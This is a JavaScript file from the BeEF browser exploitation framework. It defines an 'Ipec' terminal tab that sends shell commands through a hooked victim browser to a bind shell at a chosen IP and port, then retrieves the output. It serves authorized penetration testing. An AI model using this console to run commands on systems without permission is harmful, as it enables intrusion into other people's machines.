//
// Copyright (c) 2006-2013 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

/*
 * The Ipec Tab panel for the selected zombie.
 */

ZombieTab_IpecTab = function(zombie) {

	var commands_statusbar = new Beef_StatusBar('ipec-bbar-zombie-'+zombie.session);

    var ipec_config_panel = new Ext.Panel({
		id: 'ipec-config-zombie-'+zombie.session,
		title: 'Scan Config',
		layout: 'fit',
        autoscroll: true
	});

    function get_module_id(name, token){
        var id = "";
        var url = "/api/modules/search/" + name + "?token=" + token;
        $jwterm.ajax({
            contentType: 'application/json',
            dataType: 'json',
            type: 'GET',
            url: url,
            async: false,
            processData: false,
            success: function(data){
                id = data.id;
            },
            error: function(){
                beef.debug("Error getting module id.");
            }
        });
        return id;
    }


    function escape_html(str) {
        str = str.toString();
        str = str.replace(/</g, '&lt;');
        str = str.replace(/>/g, '&gt;');
//        str = str.replace(/\u0022/g, '&quot;');
        str = str.replace(/\u0027/g, '&#39;');
        str = str.replace(/\"\"/g, '');
        str = str.replace(/\\r/g, '');
        str = str.replace(/\\n/g, '<br>');
        str = str.replace(/\\\\/g, '\\');
        str = str.replace(/\\t/g, '&nbsp;&nbsp;&nbsp;&nbsp;');
//        str = str.replace(/\\/g, '&#92;');
        return str;
    }

    function validateNumber(input, min, max) {
        var value = parseInt(input);
        return (!isNaN(value) && value >= min && value <= max);
    }


    function initTerminal(zombie){
        String.prototype.reverse = function() {
            return this.split('').reverse().join('');
        };

        $jwterm( document ).ready( function() {
            $jwterm('#wterm').wterm( { WIDTH: '100%', HEIGHT: '100%', WELCOME_MESSAGE: 'Welcome to BeEF Bind interactive shell. To Begin Using type \'help\'' });
        });

        var target_ip = "";
        var target_port = "";

        var command_directory = {

            'target': function(tokens){
                var ip_regex = new RegExp('^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$');
                target_ip = tokens[1];
                target_port =  tokens[2];
                if(ip_regex.test(target_ip) && validateNumber(target_port, 1, 65535)){
                    return "Target is now " + tokens[1] + ":" + tokens[2];
                }else{
                    return "Target error: invalid IP or port.";
                }
            },

            'exec': function(tokens){
                if(target_ip.length == 0 || target_port.length == 0)
                   return "Error: target ip or port not set."

                tokens.shift(); //remove the first element (exec)
                var cmd = tokens.join(' '); //needed in case of commands with options
                cmd = cmd.replace(/\\/g, '\\\\'); //needed to prevent JS errors (\ need to be escaped)

                var token = beefwui.get_rest_token();
                var mod_id = get_module_id("BeEF_bind_shell", token);

                var uri = "/api/modules/" + zombie.session + "/" + mod_id + "?token=" + token;

                var result = null;

                $jwterm.ajax({
                    contentType: 'application/json',
                    data: JSON.stringify({"rhost":target_ip, "rport":target_port, "path":"/", "cmd":cmd}),
                    dataType: 'json',
                    type: 'POST',
                    url: uri,
                    async: false,
                    processData: false,
                    success: function(data){
                        beef.debug("data: " + data.command_id);
                        result = "Command [" + data.command_id + "] sent successfully";
                    },
                    error: function(){
                        beef.debug("Error sending command");
                        return "Error sending command";
                    }
                });

                return result;
            },

            'get': function(tokens){
                var command_id = tokens[1];

                if(command_id != null){

                    var token = beefwui.get_rest_token();
                    var mod_id = get_module_id("BeEF_bind_shell", token);

                    var uri_results = "/api/modules/" + zombie.session + "/" + mod_id + "/"
                        + command_id + "?token=" + token;
                    var results = "";
                    $jwterm.ajax({
                        contentType: 'application/json',
                        dataType: 'json',
                        type: 'GET',
                        url: uri_results,
                        async: false,
                        processData: false,
                        success: function(data){
                            $jwterm.each(data, function(i){
                                beef.debug("result [" + i +"]: " + $jwterm.parseJSON(data[i].data).data);
                                results += $jwterm.parseJSON(data[i].data).data;
                            });

                        },
                        error: function(){
                            beef.debug("Error sending command");
                            return "Error sending command";
                        }
                    });
                    results = escape_html(results);
                    if(results.charAt(0) == '"' && results.charAt(results.length-1) == '"')
                         results = results.slice(1,results.length-1);

                    return results;
                }
            },

            'strrev': {
                PS1: 'strrev $',

                EXIT_HOOK: function() {
                    return 'exit interface commands';
                },

                START_HOOK: function() {
                    return 'exit interface commands';
                },

                DISPATCH: function( tokens ) {
                    return tokens.join('').reverse();
                }
            }
        };

        for( var j in command_directory ) {
            $jwterm.register_command( j, command_directory[j] );
        }

        $jwterm.register_command( 'help', function() {
            return 'target - Usage: target &lt;IP&gt; &lt;port&gt; - Send commands to the specified IP:port<br>' +
                   'exec - Usage exec &lt;command&gt; &lt;command options&gt;  - Exec a command, returns the command id.<br>' +
                   'get - Usage get &lt;command id&gt; - Retrieve command results given a specified command id.<br>'

        });
    };


    var ipec_terminal_panel = new Ext.Panel({
        id: 'ipec-terminal-zombie-'+zombie.session,
        title: 'Terminal',
        layout: 'fit',
        padding: '1 1 1 1',
        autoScroll: true,
        html: "<style>body { background: #000; font-size: 1em;}</style><div id='wterm'></div>",
        listeners: {
            afterrender : function(){
                initTerminal(zombie);
            }
        }

    });

    function createIpecTerminalPanel(zombie, bar, value) {

		panel = Ext.getCmp('ipec-config-zombie-'+zombie.session);
		panel.setTitle('Prompt');
        panel.add(ipec_terminal_panel);
	}

	ZombieTab_IpecTab.superclass.constructor.call(this, {
        id: 'ipec-log-tab-'+zombie.session,
		title: 'Ipec',
		activeTab: 0,
		viewConfig: {
			forceFit: true,
			type: 'fit',
            autoScroll:true
        },
        items: [ipec_config_panel],
        bbar: commands_statusbar,
        listeners: {
			afterrender : function(){
				createIpecTerminalPanel(zombie, commands_statusbar);
			},
        autoScroll:true

        }
	});
};

Ext.extend(ZombieTab_IpecTab, Ext.TabPanel, {} );